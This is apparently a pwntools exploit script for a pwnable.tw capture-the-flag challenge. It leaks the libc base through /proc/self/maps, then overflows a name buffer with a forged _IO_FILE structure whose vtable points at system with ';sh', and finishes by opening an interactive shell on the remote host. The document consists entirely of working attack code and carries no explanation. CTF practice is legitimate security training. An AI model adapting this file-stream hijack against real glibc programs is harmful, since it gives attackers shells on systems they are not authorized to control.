#coding=utf-8
from pwn import *
local = 0
exec_file="./a"
#context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = True)
argv=["/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so",
            "--library-path","/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/","./a"]
if local :
    a=process(argv = argv)
    if context.arch == "i386" :
        libc = ELF("/home/jlx/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so")
        #libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("chall.pwnable.tw",10200)
    libc=ELF("./libc.so.6")
def get_base(a):
    print a.libs()
    text_base = a.libs()[a._cwd+"/a"]
    for key in a.libs():
        if "libc-2.23.so" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x08048A62
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :",str(idx))
def _open(name):
    menu(1)
    a.sendlineafter("What do you want to see :",name)
    return 

def read():
    menu(2)
    return 
    
def write():
    menu(3)
    return 
    
def close():
    menu(4)
    return 
relloc_offset = [0,2,4,6,0xb,0xc,0x10]
#payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'    #stdout-0x33
_open("/proc/self/maps")
read()
write()
for i in range(4):
    a.recvline()

libc_base = int(a.recv(8),16) + 0x1000
fuck(libc_base)
close()

#debug()
_open("/proc/self/maps")
fake_IO_file = 0x0804b300
payload = "A" * 0X20 + p32(fake_IO_file) + '\x00' * (0x80 - 4)
#fake start
payload += (p32(0xffffdfff) + ";sh\x00").ljust(0x94,'\x00')
payload += p32(fake_IO_file + 0x98)
payload += p32(libc_base + libc.sym["system"]) * 21
menu(5)
a.sendlineafter("Leave your name :",payload)


a.interactive()
